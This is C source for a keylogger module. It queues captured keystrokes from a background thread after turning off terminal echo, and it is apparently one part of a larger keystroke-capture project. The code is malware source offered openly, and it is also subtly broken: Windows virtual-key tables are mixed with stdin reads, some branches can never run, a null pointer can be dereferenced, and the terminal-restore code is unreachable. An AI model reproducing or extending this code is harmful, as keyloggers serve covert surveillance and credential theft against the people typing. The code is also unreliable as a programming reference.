#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include<unistd.h>
#include<termios.h>
#include<fcntl.h>
#include<pthread.h>
#include "keylogger.h"

queue* init_queue(){
    queue* q = (queue*)malloc(sizeof(queue));
	q->front = q->rear = NULL;
	return q;
}

node* create_new_node(char* value){
    node* tmp = (node*)malloc(sizeof(node));
    strcpy(tmp->key, value);
    tmp->next = NULL;
    return tmp;
}

int enqueue(queue* q, char* value){
    node* tmp = create_new_node(value);
    if (q->rear == NULL){
        q->front = q->rear = tmp;
        return 0;
    }
    q->rear->next = tmp;
    q->rear = tmp;
    return 0;
}

node* dequeue(queue* q){
    if(q->front == NULL){
        return NULL;
    }
    node* tmp = q->front;

    q->front = q->front->next;
    if(q->front == NULL){
        q->rear = NULL;
    }
    return tmp;
}

void* keylogthread(void* args){
    queue* q = (queue*)args;
    keylog(q);
    return NULL;
}

pthread_t start_keylog_thread(queue* q){
    pthread_t thread;
    pthread_create(&thread, NULL, keylogthread, q);
    return thread;
}

int get_keylog(queue* q, char* key){
    node* key_pointer;
    key_pointer = dequeue(q);
    if (key_pointer->key != NULL){
        strcpy(key, key_pointer->key);
        free(key_pointer);
        key_pointer = NULL;
        return 1;
    }
    return 0;
}

void keylog(queue* q)
{
	char* virtualKeyCodes[] = {"","<Left-Mouse>;","<Right-Mouse>;","<Cancel>;","<Middle-Mouse>;","<X1-Mouse>;",
	"<X2-Mouse>;","","<BackSpace>;","	","","","<Clear>;","<Enter>;","","","<Shift>;","<CTRL>;","<ALT>;",
	"<Pause>;","<Caps-Lock>;","","","","","","<ESC>;","","","","",""," ","<Page-Up>;",
	"<Page-Down>;","<End>;","<Home-Key>;","<Left-Arrow>;","<Up-Arrow>;","<Right-Arrow>;","<Down-Arrow>;",
	"<Select>;","<Print-Key>;","<Execute-Key>;","<Print-Screen>;","<INS>;","<Delete>;","<Help>;","0",
	"1","2","3","4","5","6","7","8","9","","","","","","","","a","b","c","d","e","f","g","h","i","j","k",
	"l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","","","",
	"","","","0","1","2","3","4","5","6","7","8","9","*","+","|","-",".","/","<F1>;","<F2>;","<F3>;","<F4>;",
	"<F5>;","<F6>;","<F7>;","<F8>;","<F9>;","<F10>;","<F11>;","<F12>;","","","","",
	"<Num-Lock>;","<Scroll-Lock>;","","","","","","","","","","","","","","","","","","<Control>;","<Control>;",
	"","","","","","","","","","","","","","","","","","","","","","","",
	"<Attn>;", "<CrSel>;","<ExSel>;","<Erase>;","<Play>;","<Zoom>;","","<PA1>;","<Clear>;"};

	char* virtualKeyCodesUpercase[] = {"A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V",
	"W","X","Y","Z"};
	char* virtualKeyCodesShiftNum[] = {")","!","@","#","$","%","^","&","*","("};
	char* virtualKeyCodesShiftSpecialOne[] = {":","+","<","_",">","?","~"};
	char* virtualKeyCodesShiftSpecialTwo[] = {"{","|","}","\""};

	int capsOn = 0; //Caps lock state
	int shiftOn = 0; // Shift state
	int shiftPressed;

	struct termios oldt, newt;
	tcgetattr(STDIN_FILENO, &oldt); // Save terminal settings
	newt = oldt;
	newt.c_lflag &= ~(ICANON | ECHO); // Disable canonical mode and echo
	tcsetattr(STDIN_FILENO, TCSANOW, &newt);

	while (1) {
		int i = getchar();

		capsOn = 0; // You can add code to check for caps lock if needed
		shiftPressed = (i >= 'A' && i <= 'Z') || (i >= '!' && i <= ')');
		shiftOn = shiftPressed;

		if (shiftOn && i >= '0' && i <= '9') {
			enqueue(q, virtualKeyCodesShiftNum[i - '0']);
		} else if (shiftOn && i >= 186 && i <= 192) {
			enqueue(q, virtualKeyCodesShiftSpecialOne[i - 186]);
		} else if (shiftOn && i >= 219 && i <= 222) {
			enqueue(q, virtualKeyCodesShiftSpecialTwo[i - 219]);
		} else if (i >= 32 && i <= 126) {
			char buffer[2] = {i, '\0'};
			enqueue(q, buffer);
		}
	}

	tcsetattr(STDIN_FILENO, TCSANOW, &oldt); // Restore terminal settings
}

